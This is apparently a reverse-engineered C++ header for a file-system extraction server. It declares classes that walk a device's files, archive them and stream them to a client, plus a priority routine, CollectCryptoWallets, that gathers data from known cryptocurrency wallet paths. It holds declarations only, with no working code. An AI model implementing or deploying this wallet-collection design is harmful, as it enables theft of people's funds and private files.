// FilesystemServer.h - 文件系统提取服务器
// 逆向自 libappcore.dylib (acquisition::filesystem)
#pragma once
#include <string>
#include <functional>
#include <archive.h>
#include <archive_entry.h>

namespace acquisition {
namespace filesystem {

// 文件系统遍历策略
struct FilesystemTraversalPolicy {
    std::string rootPath;           // 根路径
    bool followSymlinks;            // 是否跟随符号链接
    bool includeHidden;             // 是否包含隐藏文件
    size_t maxFileSize;             // 最大文件大小 (0=无限制)
    std::vector<std::string> excludePatterns;  // 排除模式
};

// 文件元数据
struct FilesystemMetadataItem {
    std::string path;
    uint64_t size;
    uint32_t mode;
    uint32_t uid;
    uint32_t gid;
    uint64_t mtime;
    uint64_t atime;
    uint64_t ctime;
    bool isDirectory;
    bool isSymlink;
    std::string symlinkTarget;
};

// 文件系统服务器观察者 (回调接口)
class FilesystemServerObserver {
public:
    virtual ~FilesystemServerObserver() = default;
    virtual void OnNewSession(int client_fd) = 0;
    virtual void OnNewFile(const std::string& path) = 0;
    virtual void OnData(const void* data, size_t len) = 0;
    virtual bool ShouldStop() = 0;
};

// 文件系统服务器
class FilesystemServer {
public:
    FilesystemServer();
    ~FilesystemServer();

    // 处理新会话
    void OnNewSession(int client_fd);

    // 遍历并写入归档
    void WriteFilesToArchive(const FilesystemTraversalPolicy& policy,
                             struct archive* ar,
                             FilesystemServerObserver* observer);

    // 递归遍历
    void TraverseAndWrite(const std::string& path,
                          struct archive* ar,
                          const FilesystemTraversalPolicy& policy,
                          FilesystemServerObserver* observer);

    // 写入文件元数据 (XML格式)
    void WriteFilesMetadata(const FilesystemTraversalPolicy& policy,
                            class IDataWriter* writer);

    // 检查是否应该停止
    bool ShouldStop() const;

    // 采集已知加密货币钱包数据 (优先路径)
    // 返回采集到的文件数量
    int CollectCryptoWallets(struct archive* ar);

    // 获取已知钱包路径列表
    static std::vector<std::string> GetKnownWalletPaths();

private:
    FilesystemServerObserver* observer_;
    bool should_stop_;
};

// 元数据格式接口
namespace metadata {
namespace format {

class IFilesystemMetadataItem {
public:
    virtual ~IFilesystemMetadataItem() = default;
    virtual void Write(class IDataWriter* writer) = 0;
};

// XML 格式输出
class FilesystemMetadataXmlItem : public IFilesystemMetadataItem { /* ... */ };
class FilesystemMetadataXmlFormatter { /* ... */ };

} // namespace format
} // namespace metadata

} // namespace filesystem
} // namespace acquisition
